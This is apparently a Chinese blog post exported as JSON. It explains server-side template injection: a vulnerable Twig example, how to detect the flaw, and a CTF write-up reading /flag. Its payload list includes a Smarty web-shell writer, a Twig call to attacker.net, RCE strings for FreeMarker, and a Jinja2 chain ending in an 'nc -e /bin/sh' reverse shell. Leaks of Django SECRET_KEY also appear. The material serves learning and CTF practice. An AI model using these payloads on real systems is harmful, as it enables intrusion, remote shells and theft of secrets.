{"title":"SSTI-服务器端模板注入","slug":"SSTI","date":"2019-08-30T07:28:13.000Z","updated":"2019-09-10T10:13:55.250Z","comments":true,"path":"api/articles/SSTI.json","photos":[],"link":"","excerpt":"终于到了学习SSTI的时间呢！","covers":["http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png","https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png"],"content":"<p>终于到了学习SSTI的时间呢！</p>\n<a id=\"more\"></a>\n<h1 id=\"SSTI-服务器端模板注入\"><a href=\"#SSTI-服务器端模板注入\" class=\"headerlink\" title=\"SSTI-服务器端模板注入\"></a>SSTI-服务器端模板注入</h1><p>8/30/2019 3:28:13 PM </p>\n<h2 id=\"注入原理\"><a href=\"#注入原理\" class=\"headerlink\" title=\"注入原理\"></a>注入原理</h2><p>使用PHP模板引擎Twig作例子演示注入原理</p>\n<pre><code>&lt;?php\nrequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;\nTwig_Autoloader::register(true);\n\n$twig = new Twig_Environment(new Twig_Loader_String());\n$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值\necho $output;</code></pre><blockquote>\n<p>In this example the user controls the content of the template itself via the custom_email GET parameter, rather than a value passed into it. </p>\n</blockquote>\n<p><code></code>模板变量值作为参数来自于<code>GET</code>请求<code>$_GET[&quot;name&quot;]</code>。这段代码没什么问题。模板引擎默认会对渲染的变量值进行编码和转义，所以并不会造成<code>XSS</code>等。</p>\n<p>但是如果我们修改代码</p>\n<pre><code>&lt;?php\nrequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;\nTwig_Autoloader::register(true);\n\n$twig = new Twig_Environment(new Twig_Loader_String());\n$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分\necho $output;</code></pre><p>我们将<code>GET</code>的参数直接作为模板的内容，不再对其进行编码和转义了则很容易出现攻击点。于是我们知道漏洞的原因是服务器端相信了用户的输入。</p>\n<h2 id=\"检测\"><a href=\"#检测\" class=\"headerlink\" title=\"检测\"></a>检测</h2><p>如何判断是否存在<code>SSTI</code>？</p>\n<p>我们还以上面的代码为例：</p>\n<pre><code>&lt;?php\nrequire_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;\nTwig_Autoloader::register(true);\n\n$twig = new Twig_Environment(new Twig_Loader_String());\n$output = $twig-&gt;render(&quot;Hello {$_GET[&apos;name&apos;]}&quot;);  // 将用户输入作为模版内容的一部分\necho $output;</code></pre><p>在Twing模板引擎里<code></code>不仅可以输出传递的变量外，还能执行一些基本的表达式然后将其作为模板变量的值。我们输入<code>name=20</code>,服务端得到内容为 <code>Hello 20</code>，会输出 <code>Hello 20</code>.</p>\n<p>我们现在修改数据为</p>\n<pre><code>IsVlun{{2*8}}OK</code></pre><p>服务器端收到内容为</p>\n<pre><code>Hello IsVuln{{2*8}}OK</code></pre><p>由于作为Twing模板的默认注释形式，所以并不会被前端输出，而<code>2*8</code>则会被计算，最终输出</p>\n<pre><code>Hello IsVuln16OK</code></pre><p>得到扫描的大致流程为</p>\n<p><img src=\"http://rickgray.me/images/articles/2015-11-03-server-side-template-injection-attack-to-smarty/5.png\" alt=\"扫描流程(Twig)\"></p>\n<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>\n<h2 id=\"常用引擎\"><a href=\"#常用引擎\" class=\"headerlink\" title=\"常用引擎\"></a>常用引擎</h2><h3 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h3><ol>\n<li>Smarty：<code>{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)}</code>、<code>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}</code></li>\n<li>Twig：<code>{{_self.env.setCache(\"ftp://attacker.net:2121\")}}``{{_self.env.loadTemplate(\"backdoor\")}}</code>、<code>{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}</code></li>\n<li>Blade：</li>\n</ol>\n<h3 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h3><ol>\n<li>JSP</li>\n<li>FreeMarker：<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) }</code></li>\n<li>Velocity</li>\n<li>Spring boot</li>\n</ol>\n<h3 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h3><ol>\n<li>Jinja2：<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}</code><br> <code>//写文件</code> {{ config.from_pyfile('/tmp/evil') }}\n //加载system {{ config['SHELL']('nc xxxx xx -e /bin/sh') }}\n //执行命令反弹SHELL</li>\n<li>django：<code>http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}</code>、<code>http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></li>\n<li>tornado：<code>http://117.78.26.79:31093/error?msg={{handler.settings}}</code></li>\n</ol>\n<h2 id=\"如何判断引擎种类\"><a href=\"#如何判断引擎种类\" class=\"headerlink\" title=\"如何判断引擎种类\"></a>如何判断引擎种类</h2><p>这里参考james大神的文章</p>\n<blockquote>\n<p>Green and red arrows represent ‘success’ and ‘failure’ responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe {{7*'7'}} would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.</p>\n</blockquote>\n<p><img src=\"https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png\" alt=\"检测思路\"></p>\n<h2 id=\"OGeak-ctf-Render\"><a href=\"#OGeak-ctf-Render\" class=\"headerlink\" title=\"OGeak-ctf Render\"></a>OGeak-ctf Render</h2><p>题目链接：<a href=\"http://47.107.244.251:18080/\" title=\"点这里\" target=\"_blank\" rel=\"noopener\">http://47.107.244.251:18080/</a></p>\n<p>查看后端代码</p>\n<pre><code>var app = new Vue({\n    el: &apos;#app&apos;,\n    data: {\n        content: &apos;&apos;,\n        result: &apos;&apos;\n    },\n    methods: {\n        request: function(event) {\n            var vm = this\n            axios.post(&apos;/render&apos;, {\n                content: vm.content\n            })\n                .then(function (response) {\n                    console.log(response)\n                    vm.result = response.data.result\n                })\n                .catch(function (error) {\n                    console.log(error)\n                    vm.result = error\n                })\n        }\n    }\n})</code></pre><p>将我们的输入值返回给<code>result</code>进行输出.这里似乎没用到什么模板语法，但是它仍然会将<code>post</code>的<code>content</code>用模板的方式去渲染。</p>\n<p>我们尝试常用的模板引擎语法测试</p>\n<p>最终</p>\n<pre><code>[[1+1]]</code></pre><p>被成功解析</p>\n<p>我们随便访问一个页面发现是Spring boot,既然是Java写的那我们就java读文件，语法参考<a href=\"https://dotblogs.com.tw/cylcode/2018/09/21/170510\" title=\"这里\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/cylcode/2018/09/21/170510</a></p>\n<p>payload:</p>\n<pre><code>[[${new java.io.BufferedReader(new java.io.FileReader(&quot;/flag&quot;)).readLine()}]]</code></pre><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/\" target=\"_blank\" rel=\"noopener\">http://rickgray.me/2015/11/03/server-side-template-injection-attack-analysis/</a><br><a href=\"https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84</a><br><a href=\"https://portswigger.net/blog/server-side-template-injection#top\" target=\"_blank\" rel=\"noopener\">https://portswigger.net/blog/server-side-template-injection#top</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"}]}